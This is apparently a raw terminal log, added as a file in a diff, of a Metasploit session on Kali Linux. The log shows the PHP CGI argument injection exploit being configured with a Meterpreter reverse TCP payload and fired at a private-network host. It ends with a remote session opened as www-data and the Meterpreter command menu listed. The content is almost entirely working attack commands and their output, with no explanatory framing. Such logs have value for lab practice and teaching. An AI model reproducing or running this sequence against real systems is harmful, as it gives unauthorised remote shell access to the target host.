@@ -1,0 +1,231 @@
+root@kali:~/Desktop# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.0.134  netmask 255.255.255.0  broadcast 192.168.0.255
+        inet6 fe80::2e0:4cff:fe62:b18  prefixlen 64  scopeid 0x20<link>
+        ether 00:e0:4c:62:0b:18  txqueuelen 1000  (Ethernet)
+        RX packets 130  bytes 8938 (8.7 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 69  bytes 5937 (5.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 20  bytes 1116 (1.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 20  bytes 1116 (1.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@kali:~/Desktop# service postgresql start
+root@kali:~/Desktop# msfconsole -q
+msf5 > search php_cgi
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank       Check  Description
+   -  ----                                      ---------------  ----       -----  -----------
+   0  exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  Yes    PHP CGI Argument Injection
+
+
+msf5 > use exploit/multi/http/php_cgi_arg_injection
+msf5 exploit(multi/http/php_cgi_arg_injection) > show options
+
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/http/php_cgi_arg_injection) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                Disclosure Date  Rank    Check  Description
+   -   ----                                ---------------  ----    -----  -----------
+   0   generic/custom                                       normal  No     Custom Payload
+   1   generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
+   2   generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
+   3   multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Mulitple Architectures)
+   4   multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Mulitple Architectures)
+   5   php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
+   6   php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
+   7   php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
+   8   php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
+   9   php/download_exec                                    normal  No     PHP Executable Download and Execute
+   10  php/exec                                             normal  No     PHP Execute Command 
+   11  php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
+   12  php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
+   13  php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
+   14  php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
+   15  php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+   16  php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+   17  php/meterpreter_reverse_tcp                          normal  No     PHP Meterpreter, Reverse TCP Inline
+   18  php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
+   19  php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)
+
+msf5 exploit(multi/http/php_cgi_arg_injection) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf5 exploit(multi/http/php_cgi_arg_injection) > set LHOST 192.168.0.134
+LHOST => 192.168.0.134
+msf5 exploit(multi/http/php_cgi_arg_injection) > show options
+
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.134    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 192.168.0.115
+RHOSTS => 192.168.0.115
+msf5 exploit(multi/http/php_cgi_arg_injection) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.134:4444 
+[*] Sending stage (38247 bytes) to 192.168.0.115
+[*] Meterpreter session 1 opened (192.168.0.134:4444 -> 192.168.0.115:59354) at 2019-07-29 12:31:14 +0530
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    chmod         Change the permissions of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    portfwd       Forward a local port to a remote service
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > getuid
+Server username: www-data (33)
+meterpreter > 
